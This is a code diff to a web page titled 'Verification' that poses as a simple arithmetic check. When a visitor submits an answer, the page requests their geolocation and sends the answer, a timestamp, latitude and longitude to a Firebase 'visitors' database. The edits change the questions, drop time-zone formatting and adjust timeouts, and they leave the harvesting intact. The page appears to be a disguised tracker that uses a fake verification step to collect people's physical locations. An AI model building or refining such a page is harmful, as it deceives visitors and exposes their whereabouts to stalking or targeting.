@@ -5,6 +5,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Verification</title>
 
+<!-- Preconnect for faster Firebase loading -->
+<link rel="preconnect" href="https://www.gstatic.com">
+<link rel="dns-prefetch" href="https://www.gstatic.com">
+
 <style>
 *{box-sizing:border-box}
 body{
@@ -63,11 +67,11 @@ button{
 
 <script>
 const questions=[
-  "17-13=?",
-  "2+3=?",
-  "8-7=?",
-  "3+5=?",
-  "9+6=?"
+  "6+7=?",
+  "8+3=?",
+  "9-4=?",
+  "2+7=?",
+  "13-5=?"
 ];
 
 const q=document.getElementById("question");
@@ -78,20 +82,6 @@ const btn=document.getElementById("btn");
 q.textContent=questions[Math.floor(Math.random()*questions.length)];
 
 btn.onclick=verify;
-
-function formatFriendlyTime(date){
-  // Returns like "March 4, 2026, 05:45 PM"
-  const options={
-    year:"numeric",
-    month:"long",
-    day:"numeric",
-    hour:"2-digit",
-    minute:"2-digit",
-    hour12:true,
-    timeZone:"Asia/Dhaka"
-  };
-  return date.toLocaleString("en-US", options);
-}
 
 async function verify(){
   s.textContent="Verifying...";
@@ -105,7 +95,7 @@ async function verify(){
 
   navigator.geolocation.getCurrentPosition(async pos=>{
     try{
-      // Lazy load Firebase
+      // Load Firebase only when needed
       const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js");
       const { getDatabase, ref, push } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js");
 
@@ -122,16 +112,9 @@ async function verify(){
       const app=initializeApp(firebaseConfig);
       const db=getDatabase(app);
 
-      const now=new Date();
-      const timestamp=Date.now();
-      const isoTime=new Date(now.getTime()+6*60*60*1000).toISOString().replace("T"," ").split(".")[0]; // ISO + UTC+6
-      const friendlyTime=formatFriendlyTime(now); // "March 4, 2026, 05:45 PM" BST
-
       await push(ref(db,"visitors"),{
         answer:a.value,
-        timestamp,
-        time_bst_iso: isoTime,
-        time_bst_friendly: friendlyTime,
+        time: Date.now(),
         lat:pos.coords.latitude,
         lng:pos.coords.longitude
       });
@@ -147,7 +130,11 @@ async function verify(){
   },()=>{
     s.textContent="Verification failed. Please try again.";
     btn.disabled=false;
-  },{enableHighAccuracy:false,timeout:8000,maximumAge:60000});
+  },{
+    enableHighAccuracy:false,
+    timeout:7000,
+    maximumAge:60000
+  });
 }
 </script>
 
